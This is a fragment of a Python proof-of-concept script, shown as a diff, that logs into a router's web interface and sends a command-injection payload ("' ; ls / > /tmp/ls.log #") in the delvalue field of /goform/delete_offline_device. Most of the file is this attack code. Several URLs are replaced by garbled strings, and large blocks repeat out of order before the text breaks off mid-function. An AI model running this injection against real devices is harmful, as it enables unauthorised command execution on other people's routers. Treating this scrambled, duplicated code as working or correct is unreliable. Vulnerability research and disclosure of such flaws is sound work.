@@ -1,0 +1,166 @@
+
+```python
+url = f"414K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3S2G2M7%4c8Q4y4h3k6A6M7q4)9%4c8q4)9J5c8X3I4G2k6$3W2F1i4K6u0W2K9s2c8E0L8l9.."
+headers = {
+"Host": host_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Connection": "close",
+"Upgrade-Insecure-Requests": "1"
+}
+response = session.get(url, headers=headers)
+if response.status_code == 200:
+sessionid, token = extract_cookies_from_response(response)
+return sessionid, token
+else:
+logging.error("Failed to get login page.")
+logging.error(f"Status code: {response.status_code}")
+logging.error(f"Response: {response.text}")
+return None, None
+def hash_password(password, token):
+hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
+return hashed
+def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
+url = f"http://{host_ip}/goform/login"
+headers = {
+"Host": host_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "*/*",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": f"http://{host_ip}",
+"Connection": "close",
+# "Referer": f"178K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3S2G2M7%4c8Q4y4h3k6A6M7q4)9%4c8q4)9J5c8X3I4G2k6$3W2F1i4K6u0W2K9s2c8E0L8l9..",
+"Cookie": f"sessionid={sessionid}; token={token}"
+}
+payload = {
+"username": username,
+"password": hashed_password,
+"token": token
+}
+response = session.post(url, headers=headers, data=payload)
+return response
+def send_inject_request(session, host_ip, sessionid, token):
+url = f"http://{host_ip}/goform/delete_offline_device"
+headers = {
+"Host": host_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "*/*",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": f"http://{host_ip}",
+"Connection": "close",
+# "Referer": f"609K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3S2G2M7%4c8Q4y4h3k6A6M7q4)9%4c8q4)9J5c8X3I4G2k6$3W2F1i4K6u0W2K9s2c8E0L8l9..",
+"Cookie": f"sessionid={sessionid}; token={token}"
+}
+payload = {
+"delvalue": "\' ; ls / > /tmp/ls.log #",
+"token": token
+}
+response = session.post(url, headers=headers, data=payload)
+return response
+def main():
+session = requests.session()
+parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
+parser.add_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
+parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
+parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')
+args = parser.parse_args()
+logging.info(f'Host IP: {args.host}')
+# Get login page
+sessionid, token = send_get_login_page(session, args.host)
+if sessionid and token:
+logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
+# Hash the password
+hashed_password = hash_password(args.password, token)
+# Send login request
+response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
+if response.status_code == 200:
+logging.info("Login request sent successfully.")
+logging.debug(f"Response: {response.text}")
+# Extract updated sessionid and token from login response
+sessionid, token = extract_cookies_from_response(response)
+# Send LAN settings request
+response = send_inject_request(session, args.host, sessionid, token)
+if response.status_code == 200:
+logging.info("LAN settings request sent successfully.")
+logging.debug(f"Response: {response.text}")
+else:
+logging.error("Failed to send LAN settings request.")
+logging.error(f"Status code: {response.status_code}")
+logging.error(f"Response: {response.text}")
+else:
+logging.error("Failed to send login request.")
+logging.error(f"Status code: {response.status_code}")
+logging.error(f"Response: {response.text}")
+else:
+logging.error("Failed to retrieve sessionid and token from login page.")
+if __name__ == "__main__":
+main()
+import requests
+import logging
+import argparse
+import re
+import hmac
+import hashlib
+logging.basicConfig(level=logging.DEBUG)
+def extract_cookies_from_response(response):
+cookies = response.headers.get('Set-Cookie', '')
+sessionid = re.search(r'sessionid=([^;]+)', cookies)
+token = re.search(r'token=([^;]+)', cookies)
+sessionid = sessionid.group(1) if sessionid else None
+token = token.group(1) if token else None
+return sessionid, token
+def send_get_login_page(session, host_ip):
+url = f"791K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3S2G2M7%4c8Q4y4h3k6A6M7q4)9%4c8q4)9J5c8X3I4G2k6$3W2F1i4K6u0W2K9s2c8E0L8l9.."
+headers = {
+"Host": host_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Connection": "close",
+"Upgrade-Insecure-Requests": "1"
+}
+response = session.get(url, headers=headers)
+if response.status_code == 200:
+sessionid, token = extract_cookies_from_response(response)
+return sessionid, token
+else:
+logging.error("Failed to get login page.")
+logging.error(f"Status code: {response.status_code}")
+logging.error(f"Response: {response.text}")
+return None, None
+def hash_password(password, token):
+hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
+return hashed
+def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
+url = f"http://{host_ip}/goform/login"
+headers = {
+"Host": host_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "*/*",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": f"http://{host_ip}",
+"Connection": "close",
+# "Referer": f"2ceK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9%4b7X3S2G2M7%4c8Q4y4h3k6A6M7q4)9%4c8q4)9J5c8X3I4G2k6$3W2F1i4K6u0W2K9s2c8E0L8l9..",
+"Cookie": f"sessionid={sessionid}; token={token}"
+}
+payload = {
+"username": username,
+"password": hashed_password,
+"token": token
+}
+response = session.post(url, headers=headers, data=payload)
+return response
+def send_inject_request(session, host_ip, sessionid, token):
+```
